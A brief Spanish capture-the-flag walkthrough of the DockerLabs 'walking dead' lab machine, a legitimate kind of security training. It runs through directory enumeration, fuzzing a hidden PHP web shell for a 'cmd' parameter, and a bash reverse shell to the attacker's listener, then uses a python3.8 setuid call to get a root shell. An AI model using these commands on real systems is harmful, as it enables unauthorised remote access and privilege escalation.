nmap: 22,80

![image](https://github.com/user-attachments/assets/fa1ec9f2-3652-4885-b2da-5f55617289e1)

entramos a la pagina y tenemos esto

![[dockerlabs/facil/walking dead/pagina1.png]]

y en el código fuente esto:

![[dockerlabs/facil/walking dead/fuente.png]]

ahí muestra una "shell.php" y un "acces panel", hacemos un gobuster 

      gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,php,py,txt

vamos consiguiendo diferentes resultados

un backup.txt

![[dockerlabs/facil/walking dead/backup.png]]

un hidden

![[dockerlabs/facil/walking dead/hidden.png]]

probamos el hidden con el shell.php que nos mostro el código fuente

![[shell.php.png]]

pero no nos muestra nada, pero como es una shell.php vamos a probar si directorios extras comunes como un "?file" o "?cmd", de no ser así lanzamos este comando

     wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt "http://172.17.0.2/hidden/.shell.php?FUZZ=id"

pero funciona con el "cmd"

![[shell1.png]]

así que podemos lanzar una bash y dejar el terminal en escucha

    bash -c 'bash -i>& /dev/tcp/172.17.0.1/443 0>&1'

tenemos esta pero no funciona así que la podemos URL encodear https://www.urlencoder.org/

y obtenemos la conexión

![[dockerlabs/facil/walking dead/conexion.png]]

ahora escalamos a root, encontramos esto

![[escalada 1.png]]

igual encontramos esto

![[cat1.png]]

python 3.8, así que podemos lanzar este comando para ser root

     python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'

![[rooot.png]]

y somos root! 
